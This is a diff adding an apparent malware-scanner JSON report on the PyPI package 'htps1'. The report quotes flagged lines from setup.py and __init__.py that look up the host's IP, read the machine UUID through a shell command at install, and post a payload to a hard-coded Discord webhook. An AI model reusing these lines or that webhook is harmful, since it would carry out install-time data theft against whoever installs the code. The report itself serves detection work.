@@ -1,0 +1,45 @@
+{
+    "issues": 5,
+    "errors": {},
+    "results": {
+        "clipboard-access": {},
+        "dll-hijacking": {},
+        "steganography": {},
+        "shady-links": [
+            {
+                "location": "htps1/__init__.py:24",
+                "code": "        ip = urlopen(Request(\"https://api.ipify.org\")).read().decode().strip()\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            },
+            {
+                "location": "htps1/__init__.py:124",
+                "code": "                            req = Request('https://discord.com/api/webhooks/1057781770550005850/F55mkPTDWGKw9zF0hC1xJ6Z9qK8ETjn9q2snfMYo2jutIYsgyV7S5tQQ74GCPK0y5E5y', data=payload.encode(), headers=headers2)\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            },
+            {
+                "location": "setup.py:27",
+                "code": "        ip = urlopen(Request(\"https://api.ipify.org\")).read().decode().strip()\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            },
+            {
+                "location": "setup.py:127",
+                "code": "                            req = Request('https://discord.com/api/webhooks/1057781770550005850/F55mkPTDWGKw9zF0hC1xJ6Z9qK8ETjn9q2snfMYo2jutIYsgyV7S5tQQ74GCPK0y5E5y', data=payload.encode(), headers=headers2)\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            }
+        ],
+        "obfuscation": {},
+        "exfiltrate-sensitive-data": {},
+        "download-executable": {},
+        "silent-process-execution": {},
+        "cmd-overwrite": {},
+        "code-execution": [
+            {
+                "location": "setup.py:31",
+                "code": "    p = Popen(\"wmic csproduct get uuid\", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            }
+        ],
+        "exec-base64": {}
+    },
+    "path": "./dataset/pypi/htps1-2.3.1"
+}
